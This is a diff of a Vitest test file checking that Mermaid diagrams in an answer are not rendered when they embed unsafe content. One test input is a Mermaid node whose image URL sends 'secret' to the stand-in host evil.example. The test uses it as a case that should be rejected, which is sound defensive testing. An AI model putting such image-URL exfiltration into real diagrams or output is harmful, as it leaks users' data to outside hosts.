@@ -1,18 +1,14 @@
 import { describe, expect, test, vi } from 'vitest'
 
 const drawn = vi.hoisted(() => vi.fn(async () => '<svg></svg>'))
-
 vi.mock('../../fences/src/api', async (original) => ({
   ...(await original<typeof import('../../fences/src/api')>()),
   drawDiagram: drawn,
 }))
-
 const { answerHtml } = await import('./drawn')
-
 function fence(code: string, language = 'mermaid'): string {
   return `\`\`\`${language}\n${code}\n\`\`\``
 }
-
 describe('a diagram in an answer', () => {
   test.each([
     'flowchart TD\n  A@{ img: "https://evil.example/x.png?d=secret" }',
@@ -29,7 +25,6 @@ describe('a diagram in an answer', () => {
     expect(drawn).not.toHaveBeenCalled()
     expect(html).toContain('<pre><code')
   })
-
   test('that only draws is drawn', () => {
     drawn.mockClear()
     answerHtml(fence('flowchart TD\n  A[Start: here] --> B<br/>end\n  B <--> C\n  C <|-- D'))
